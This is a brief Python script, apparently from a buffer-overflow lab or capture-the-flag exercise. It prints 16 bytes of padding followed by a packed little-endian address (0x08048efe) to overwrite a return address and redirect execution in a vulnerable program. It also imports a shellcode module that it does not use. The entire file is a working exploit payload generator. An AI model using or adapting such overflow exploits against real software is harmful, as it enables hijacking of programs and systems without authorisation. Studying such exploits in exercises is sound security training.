import struct
import sys
from struct import pack
from shellcode import shellcode

str = "a"*16
sys.stdout.buffer.write(str.encode()+ pack("<I",0x08048efe))
